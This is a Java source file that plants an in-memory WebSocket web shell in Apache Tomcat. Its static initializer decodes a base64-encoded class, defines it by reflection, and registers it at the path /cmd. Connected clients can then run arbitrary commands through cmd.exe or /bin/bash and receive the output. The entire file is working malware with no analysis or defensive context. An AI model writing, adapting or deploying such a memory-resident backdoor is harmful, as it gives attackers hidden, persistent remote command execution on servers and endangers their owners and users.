import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;
import org.apache.tomcat.websocket.server.WsServerContainer;
import sun.misc.BASE64Decoder;
import javax.websocket.*;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;
import java.lang.reflect.Method;

public class WsCmd {
    static {
        String urlPath = "/cmd";
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
            StandardContext standardContext = (StandardContext) standardroot.getContext();
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            Class clazz;
            BASE64Decoder base64Decoder = new BASE64Decoder();
            String codeClass = "yv66vgAAADEAdgoAHgAuCAAvCgAwADEKAAgAMggAMwoACAA0CgA1ADYHADcIADgIADkKADUAOggAOwgAPAoAPQA+BwA/CgAPAC4KAEAAQQoADwBCCgBAAEMKAD0ARAkAHQBFCwBGAEcKAA8ASAsASQBKBwBLCgAZAEwLAEYATQoAHQBOBwBPBwBQBwBSAQAHc2Vzc2lvbgEAGUxqYXZheC93ZWJzb2NrZXQvU2Vzc2lvbjsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAJb25NZXNzYWdlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAGb25PcGVuAQA8KExqYXZheC93ZWJzb2NrZXQvU2Vzc2lvbjtMamF2YXgvd2Vic29ja2V0L0VuZHBvaW50Q29uZmlnOylWAQAVKExqYXZhL2xhbmcvT2JqZWN0OylWAQAJU2lnbmF0dXJlAQAFV2hvbGUBAAxJbm5lckNsYXNzZXMBAFRMamF2YXgvd2Vic29ja2V0L0VuZHBvaW50O0xqYXZheC93ZWJzb2NrZXQvTWVzc2FnZUhhbmRsZXIkV2hvbGU8TGphdmEvbGFuZy9TdHJpbmc7PjsMACIAIwEAB29zLm5hbWUHAFMMAFQAVQwAVgBXAQAHd2luZG93cwwAWABZBwBaDABbAFwBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDABdAF4BAAkvYmluL2Jhc2gBAAItYwcAXwwAYABhAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIHAGIMAGMAZAwAZQBmDABnACMMAGgAZAwAIAAhBwBpDABqAGwMAG0AVwcAbwwAcAAmAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAcQAjDAByAHMMACUAJgEABFRlc3QBABhqYXZheC93ZWJzb2NrZXQvRW5kcG9pbnQHAHQBACRqYXZheC93ZWJzb2NrZXQvTWVzc2FnZUhhbmRsZXIkV2hvbGUBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAEcmVhZAEAAygpSQEABmFwcGVuZAEAHChDKUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAVjbG9zZQEAB3dhaXRGb3IBABdqYXZheC93ZWJzb2NrZXQvU2Vzc2lvbgEADmdldEJhc2ljUmVtb3RlAQAFQmFzaWMBACgoKUxqYXZheC93ZWJzb2NrZXQvUmVtb3RlRW5kcG9pbnQkQmFzaWM7AQAIdG9TdHJpbmcHAHUBACRqYXZheC93ZWJzb2NrZXQvUmVtb3RlRW5kcG9pbnQkQmFzaWMBAAhzZW5kVGV4dAEAD3ByaW50U3RhY2tUcmFjZQEAEWFkZE1lc3NhZ2VIYW5kbGVyAQAjKExqYXZheC93ZWJzb2NrZXQvTWVzc2FnZUhhbmRsZXI7KVYBAB5qYXZheC93ZWJzb2NrZXQvTWVzc2FnZUhhbmRsZXIBAB5qYXZheC93ZWJzb2NrZXQvUmVtb3RlRW5kcG9pbnQAIQAdAB4AAQAfAAEAAgAgACEAAAAEAAEAIgAjAAEAJAAAABEAAQABAAAABSq3AAGxAAAAAAABACUAJgABACQAAACoAAUABwAAAJQSArgAA7YABBIFtgAGPh2ZAB+4AAcGvQAIWQMSCVNZBBIKU1kFK1O2AAtNpwAcuAAHBr0ACFkDEgxTWQQSDVNZBStTtgALTSy2AA46BLsAD1m3ABA6BRkEtgARWTYGAp8ADxkFFQaStgASV6f/6xkEtgATLLYAFFcqtAAVuQAWAQAZBbYAF7kAGAIApwAITSy2ABqxAAEAAACLAI4AGQAAAAEAJwAoAAEAJAAAABkAAgADAAAADSortQAVKyq5ABsCALEAAAAAEEEAJQApAAEAJAAAABUAAgACAAAACSorwAAItgAcsQAAAAAAAgAqAAAAAgAtACwAAAASAAIAHwBRACsGCQBJAG4AawYJ";
            byte[] bytes = base64Decoder.decodeBuffer(codeClass);
            Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            method.setAccessible(true);
            clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
            ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(clazz, urlPath).build();
            WsServerContainer container = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
            if (null == container.findMapping(urlPath)) {
                try {
                    System.out.println("addpoint");
                    container.addEndpoint(configEndpoint);
                } catch (DeploymentException e) {
                    e.printStackTrace();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
